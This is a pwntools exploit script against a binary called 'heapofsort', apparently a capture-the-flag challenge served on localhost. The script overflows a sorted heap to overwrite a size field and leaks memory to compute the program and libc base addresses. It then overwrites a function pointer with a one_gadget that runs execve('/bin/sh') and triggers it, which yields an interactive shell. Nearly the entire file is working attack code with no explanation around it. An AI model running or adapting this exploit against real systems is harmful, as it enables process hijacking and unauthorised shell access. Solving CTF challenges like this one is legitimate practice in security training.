from pwn import *
context.binary = exe = ELF('./heapofsort')
context.terminal = ['tmux', 'splitw', '-h']

gdbscript = """
c
"""

#io = gdb.debug(exe.path, gdbscript)
#io = process(exe.path)
io = remote('localhost', 50000)

def insert(value):
    io.sendlineafter(b': ', b'1')
    io.sendlineafter(b': ', str(value).encode())

def delete(index):
    io.sendlineafter(b': ', b'2')
    io.sendlineafter(b': ', str(index).encode())

def show():
    io.sendlineafter(b': ', b'3')

for i in range(100):
    insert(0x7fffffffffff) # High value to ensure these junk values are sorted to the beginning (before the overflows)

NEW_SIZE = 0x70

insert(NEW_SIZE) # overwrites the size field

show()

io.readuntil(b'Heap: ')

leak = [int(io.readuntil(b' ')) for _ in range(NEW_SIZE)]

""" for i in range(NEW_SIZE):
    log.info(f'{i}: {hex(leak[i])}') """

base = leak[101] - 0x1255
libc = leak[111] - 0x29d90

log.info(f'base: {hex(base)}')
log.info(f'libc: {hex(libc)}')

"""
0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
"""

one_gadget = libc + 0xebc88

for i in range(1,8):
    delete(NEW_SIZE-i)

insert(one_gadget) # overwrites heap_remove

delete(0) # trigger one_gadget

io.interactive()

